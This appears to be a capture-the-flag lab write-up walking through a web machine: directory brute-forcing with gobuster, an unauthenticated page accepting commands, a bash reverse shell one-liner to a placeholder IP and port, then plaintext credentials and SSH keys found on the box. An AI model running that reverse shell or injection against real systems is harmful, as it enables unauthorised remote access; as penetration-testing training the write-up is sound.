## Description
<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119040663-43719300-b9e8-11eb-93b9-9084d21a8b85.png"/>
</p>
 
## Hands on

First , we slap the ip into our browser to check if port 80(common web server) is up and yes it is !
<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119142345-fa1d5400-ba78-11eb-97a9-5e0b27c4618e.png"/>
</p>

look like a credential is required

lets try <a href="https://tools.kali.org/web-applications/gobuster">gobuster(CLI)/dirbuster(GUI)</a> to brute force the web directory for hidden files

<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119142807-7879f600-ba79-11eb-8cc8-0236aca6441f.png"/>
</p>



Note : <br/>
<ul>
<li>dir specify brute force the directory </li>
<li>-u specify the web browser url</li>
<li>-w specify the dictionary path for the attack</li>
<li>-t specify how many thread to be used for the attack</li> 
<li>-o specify output file name</li>
</ul>

and we found the hidden directory named :

"home.php" 

<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119143134-d8709c80-ba79-11eb-85fb-d91fe7fb960f.png"/>
</p>

guess what ? who need credentials when you can access the page without one ?

"validate.php" , Look like incorrect credentials goes here

<p align="center">
 
<image src="https://user-images.githubusercontent.com/78603128/119142989-b37c2980-ba79-11eb-82ae-a0ab52a03f25.png"/>

 </p>
 
Moving on , we can check if the machine is linux by using  "uname -a" command

<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119144800-98121e00-ba7b-11eb-87be-10057beb2d04.png"/>
</p>

and yess , now slap reverse shell command into the input 

<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119146838-9cd7d180-ba7d-11eb-8f00-ffd68cb68676.png"/>
</p>
 
```
 bash -c 'exec bash -i &>/dev/tcp/$YOUR IP/$PORT <&1'
 
```

remember to start a listener on the port you input
<br/>
<br/>

And within few seconds , we will get a reverse shell and able to run as **www-data** !


<image src="https://user-images.githubusercontent.com/78603128/119147026-cabd1600-ba7d-11eb-88cc-a69eadb0ac62.png"/>


now we search for the key , key_rey_key seems sus and by trying strings command we found the key


<image src="https://user-images.githubusercontent.com/78603128/119148594-38b60d00-ba7f-11eb-8a24-17a264bc10d0.png"/>


and we are lucky to found the user credentials in plain text inside the **validate.php** code
<br/>

<image src="https://user-images.githubusercontent.com/78603128/119148927-92b6d280-ba7f-11eb-8a86-b8d60f193eff.png"/>

switch user to charlie and we got the flag , oh yeah.. you cant switch user here..
<br/>

<image src="https://user-images.githubusercontent.com/78603128/119149250-ede8c500-ba7f-11eb-94b8-21823441721b.png"/>

looking around charlie directory , we found RSA private and public key to login via SSH !
<br/>

<image src="https://user-images.githubusercontent.com/78603128/119149549-36a07e00-ba80-11eb-9cd8-c3f5e9b77a83.png"/>






